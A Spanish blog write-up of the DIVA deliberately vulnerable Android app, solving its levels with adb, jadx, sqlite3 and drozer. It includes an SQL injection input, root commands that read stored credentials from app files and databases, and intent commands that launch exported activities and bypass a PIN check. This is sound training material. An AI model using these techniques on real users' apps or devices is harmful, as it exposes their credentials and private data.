---
layout: post
title: Una DIVA es... Vulnerable?
comments: true
categories: [Mobile, Writeups]
---

Como dijo Melody en Eurovisión, *Una diva es valiente, poderosa* y vulnerable??? En este post estaremos superando los retos de DIVA ó *Damn Vulnerable and Insecure App*, este es un proyecto para aprender lo básico sobre explotación en Android.

# Instalación

Lo mejor es instalar la aplicación en un dispositivo *rooteado*, conectado al equipo mediante USB. Para instalarla podemos hacerlo mediante la herramienta **adb**:

```bash
adb install DIVA.apk
```

Una vez instalada veremos un menú con los siguientes niveles:

# Insecure Loging

El primer nivel nos muestra un campo que espera un número de tarjeta de crédito. Nos piden que veamos como se está logueando la información. Si descompilamos con **jadx** veremos como se está

Con **adb** podemos ver los logs:

```bash
adb logcat | grep -i "Error while"

06-27 12:17:52.106 22839 22839 E diva-log: Error while processing transaction with credit card: <El número que hemos introducido>
```

# Hardcoding Issues - Part 1

En el segundo nivel vemos una vista similar a la anterior que nos solicita una clave. Si inspeccionamos el código veremos lo siguiente:

# Insecure Data Storage - Part 1

En este nivel se nos da una especie de logging, y se nos pide que encontremos donde se almacenan las credenciales. Decompilando el programa, vemos que se almacenan en la configuración por defecto:

Podemos acceder a ella con **adb**:

```bash
adb shell

su

cd /data/data/jakhar.aseem.diva/shared_prefs

cat jakhar.aseem.diva_preferences.xml                                                         
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="password">password</string>
    <string name="notespin">5569</string>
    <string name="user">naibu3</string>
</map>
```

Y podríamos ver la información que hay almacenada. Hay que recalcar que si no introducimos unas credenciales rpreviamente, el archivo no existirá.

# Insecure Data Storage - Part 2

En este segundo nivel las credenciales parecen almacenarse en una base de datos:

No podemos extraerla directamente, pero podemos copiarla en `/data/local/tmp`, ya que ahí tenemos permisos:

```bash
tucana:/data/data/jakhar.aseem.diva/databases # cp ids2 /data/local/tmp  
```

Y nos la descargamos con **adb**:

```bash
adb pull /data/local/tmp/ids2
/data/local/tmp/divanotes.db: 1 file pulled, 0 skipped. 6.3 MB/s (20480 bytes in 0.003s)
```

Y con **sqlite3** podemos ver la tabla `myuser`:

```bash
sqlite> .tables
android_metadata  myuser          
sqlite> select * from myuser;
naibu3 |naibu3
```

# Insecure Data Storage - Part 3

Este nivel es muy similar, pero en este caso se almacenan en texto plano en un archivo:

```bash
tucana:/data/data/jakhar.aseem.diva # cat uinfo8847310758726822991tmp                                                                            
naibu3:naibu3
```

# Insecure Data Storage - Part 4

Este último nivel es igual que el anterior, pero se trata de u archivo oculto:

# Input Validation Issues - Part 1

En este nivel se nos da un capo para buscar nombres de usuario. Sin embargo, si revisamos el código veremos que es vulnerable a SQLi:

Con una entrada como `' or '1'='1` podemos ver todos los usuarios:

# Input Validation Issues - Part 2

Dado que trata de acceder a una URL sin ninguna validación, podemos listar archivos locales como el del ejercicio 1.

# Access Control Issues - Part 1

En esta parte nos mencionan que hay una api corriendo, nos permiten entrar a la pestaña que muestra las credenciales. Sin embargo el objetivo es acceder desde fuera de la apicación:

```bash
sudo adb shell am start -n jakhar.aseem.diva/jakhar.aseem.diva.APICredsActivity
Starting: Intent { cmp=jakhar.aseem.diva/.APICredsActivity }
```

También se puede lanzar con:

```bash
sudo adb shell am start -a jakhar.aseem.diva.VIEWCREDS
```

# Access Control Issues - Part 2

Este nivel es similar al anterior, pero en este caso se comprueba que se reciba un valor booleano:

```java
Intent i = getIntent();
boolean bcheck = i.getBooleanExtra(getString(R.string.chk_pin), true);
if (!bcheck) {
    apicview.setText("TVEETER API Key: secrettveeterapikey\nAPI User name: diva2\nAPI Password: p@ssword2");
    return;
}
```

Vamos a investigar con **drozer**:

```bash
adb forward tcp:31415 tcp:31415
31415
```

```bash
drozer console connect
Selecting 49d862176aaee32d (Xiaomi Mi Note 10 11)

            ..                    ..:.
           ..o..                  .r..
            ..a..  . ....... .  ..nd
              ro..idsnemesisand..pr
              .otectorandroidsneme.
           .,sisandprotectorandroids+.
         ..nemesisandprotectorandroidsn:.
        .emesisandprotectorandroidsnemes..
      ..isandp,..,rotecyayandro,..,idsnem.
      .isisandp..rotectorandroid..snemisis.
      ,andprotectorandroidsnemisisandprotec.
     .torandroidsnemesisandprotectorandroid.
     .snemisisandprotectorandroidsnemesisan:
     .dprotectorandroidsnemesisandprotector.

drozer Console (v3.1.0)
dz> run app.activity.info -a jakhar.aseem.diva
Attempting to run shell module
Package: jakhar.aseem.diva
  jakhar.aseem.diva.MainActivity
    Permission: null
  jakhar.aseem.diva.APICredsActivity
    Permission: null
  jakhar.aseem.diva.APICreds2Activity
    Permission: null
```

Para pasar dicho valor podemos utilizar el siguiente comando en drozer:

```bash
dz> run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICreds2Activity --extra boolean check_pin false
Attempting to run shell module
```

